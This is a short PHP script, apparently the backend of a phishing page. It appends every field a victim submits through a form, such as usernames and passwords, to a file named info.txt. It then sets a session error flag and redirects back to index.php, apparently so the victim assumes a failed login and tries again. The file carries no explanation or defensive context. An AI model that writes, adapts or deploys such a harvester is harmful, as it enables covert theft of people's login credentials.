<?php
session_start();
$_SESSION['error'] = 1;
$handle = fopen('info.txt', 'a');

foreach($_POST as $variable => $value) {

fwrite($handle, $variable);

fwrite($handle, '=');

fwrite($handle, $value);

fwrite($handle, '\r\n');

}

fwrite($handle, '===============\r\n');

fclose($handle);
header('Location:index.php');

?>
